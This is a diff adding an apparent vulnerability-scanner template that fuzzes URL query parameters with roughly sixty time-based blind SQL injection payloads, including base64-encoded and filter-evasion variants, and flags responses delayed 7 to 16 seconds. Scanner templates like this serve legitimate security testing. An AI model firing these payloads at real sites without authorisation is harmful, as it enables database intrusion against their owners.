@@ -1,0 +1,87 @@
+id: time-based-sqli
+info:
+  name: Time-Based Blind SQL Injection
+  author: github.com/rzizah
+  severity: Critical
+  description: Detects time-based blind SQL injection vulnerability
+http:
+  - method: GET
+    path:
+        - "{{BaseURL}}" 
+    payloads:
+      injection:
+      - "(SELECT(0)FROM(SELECT(SLEEP(7)))a)"
+      - "'XOR(SELECT(0)FROM(SELECT(SLEEP(7)))a)XOR'Z"
+      - "' AND (SELECT 4800 FROM (SELECT(SLEEP(7)))HoBG)--"
+      - "if(now()=sysdate(),SLEEP(7),0)"
+      - "'XOR(if(now()=sysdate(),SLEEP(7),0))XOR'Z"
+      - "'XOR(SELECT CASE WHEN(1234=1234) THEN SLEEP(7) ELSE 0 END)XOR'Z"
+      - "1' OR NOT 2470=2470-- Ontu"
+      - "' WAITFOR DELAY '0:0:7'--"
+      - "';WAITFOR DELAY '0:0:7'--"
+      - "')) or sleep(7)='"
+      - ";waitfor delay '0:0:7'--"
+      - ");waitfor delay '0:0:7'--"
+      - "';waitfor delay '0:0:7'--"
+      - "');waitfor delay '0:0:7'--"
+      - "));waitfor delay '0:0:7'--"
+      - "'XOR(if(now()=sysdate(),sleep(7),0))XOR'"
+      - "'XOR(if(now()=sysdate(),sleep(7*1),0))OR'"
+      - "bug4y0u'+AND+/**/(%53ELEcT+1+/**/+fRoM/**/+(SE%4cEC%54(sL%45%45P(7%29%29%29a)+A%4ed+ 'bug4y0u'%3d'bug4y0u"
+      - "') AND (SELECT 4796 FROM (SELECT(SLEEP(7)))YYYY) AND ('1337'='1337 and SELECT pg_sleep(7);"
+      - "'xor(if(now()=sysdate(),sleep(7),0))or"
+      - "J1hPUihpZihub3coKT1zeXNkYXRlKCksc2xlZXAoNyoxKSwwKSlPUic="
+      - "J1hPUihpZihub3coKT1zeXNkYXRlKCksc2xlZXAoNyksMCkpWE9SJw=="
+      - "JytBTkQrKFNFTEVDVCsyMDE2K0ZST00rKFNFTEVDVChTTEVFUCg3KSkpU0lmdikrQU5EKyd2RFpQJyUzZCd2RFpQ"
+      - "KHNlbGVjdCpmcm9tKHNlbGVjdChzbGVlcCg3KSkpYSk="
+      - "LChzZWxlY3QgKiBmcm9tIChzZWxlY3Qoc2xlZXAoNykpKWEp"
+      - "MCdvcihub3coKT1zeXNkYXRlKCkmJlNMRUVQKDcpKW9yJ1o="
+      - "MCdYT1IoaWYobm93KCk9c3lzZGF0ZSgpLHNsZWVwKDcqMSksMCkpWE9SJ1o="
+      - "MCdYT1IoaWYobm93KCk9c3lzZGF0ZSgpLHNsZWVwKDcpLDApKVhPUida"
+      - "MSclMmIoc2VsZWN0KmZyb20oc2VsZWN0KHNsZWVwKDcpKSlhKSUyYic="
+      - "if(now()=sysdate(),sleep(7),0)"
+      - "admin'))%20OR%20335=(SELECT%20335%20FROM%20PG_SLEEP(15))--"
+      - "admin%20waitfor%20delay%20'0:0:7'%20--%20"
+      - "admin%20OR%202%2B949-949-1=0%2B0%2B0%2B1%20--%20"
+      - "admin%20OR%202%2B669-669-1=0%2B0%2B0%2B1"
+      - "(select(0)from(select(sleep(7)))v)+"
+      - "(select(0)from(select(sleep(7)))v)+'"
+      - "(select(0)from(select(sleep(7)))v)/*'+"
+      - "(select(0)from(select(sleep(7)))v)%2f'+"
+      - "(select(0)from(select(sleep(7)))v)%2f*'+"
+      - "(select(0)from(select(sleep(13)))v)/*'+(select(0)from(select(sleep(13)))v)+'\"+(select(0)from(select(sleep(13)))v)+\"*/"
+      - "]-(SELECT 0 WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(7)))YYYY))|[1"
+      - "+(SELECT 1337 WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(7)))YYYY))+"
+      - "'+(select*from(select(sleep(7)))a)+'"
+      - "(select*from(select(sleep(7)))a)"
+      - ",(select * from (select(sleep(7)))a)"
+      - "(SELECT * FROM (SELECT(SLEEP(7)))YYYY)"
+      - "(SELECT * FROM (SELECT(SLEEP(7)))YYYY)#"
+      - "(SELECT * FROM (SELECT(SLEEP(7)))YYYY)--"
+      - "admin'))%20OR%20335=(SELECT%20335%20FROM%20PG_SLEEP(7))--"
+      - "-6513%27%20OR%20%28SELECT%20INSTR2%28NULL%2CNULL%29%20FROM%20DUAL%29%20IS%20NULL--%20SpSw"
+      - "admin%20waitfor%20delay%20'0:0:7'%20--%20"
+      - "admin%20OR%202%2B949-949-1=0%2B0%2B0%2B1%20--%20"
+      - "admin%20OR%202%2B669-669-1=0%2B0%2B0%2B1"
+      - "'xor(if(now()=sysdate(),sleep(7),0))or"
+      - "if(now()=sysdate()%2Csleep(7)%2C0)"
+      - "admin';%20waitfor%20delay%20'0:0:7'%20--%20"
+      - "admin'%20OR%20227=(SELECT%20227%20FROM%20PG_SLEEP(7))--"
+      - "admin')%20OR%20565=(SELECT%20565%20FROM%20PG_SLEEP(7))--"
+      - "10%20AND%20(SELECT%204814%20FROM%20(SELECT(SLEEP(7)))jQqq)"
+      - "+or+sleep(0.2)%23)"
+      - "-1;%20waitfor%20delay%20'0:0:7'%20--%20"
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+            - "{{injection}}"
+    stop-at-first-match: true
+    matchers:
+     - type: dsl
+       dsl:
+       - "status_code == 200"
+       - "duration>=7 && duration <=16"
+       condition: and
